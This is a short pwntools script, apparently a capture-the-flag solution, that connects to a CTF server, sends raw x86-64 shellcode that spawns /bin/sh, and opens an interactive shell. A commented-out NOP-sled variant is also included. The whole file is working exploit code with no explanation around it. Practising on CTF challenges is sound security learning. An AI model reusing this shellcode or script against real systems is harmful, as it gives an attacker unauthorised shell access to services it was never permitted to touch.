from pwn import *

p = remote("ctf.adl.tw", 10002)

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

""" Test nop sled
# nop_seq = b'0x90' * (200 - len(shellcode))
# payload = nop_seq + shellcode + jump_to
"""

payload = shellcode

p.recvuntil("buffer!!!")
p.send(payload)

p.interactive()
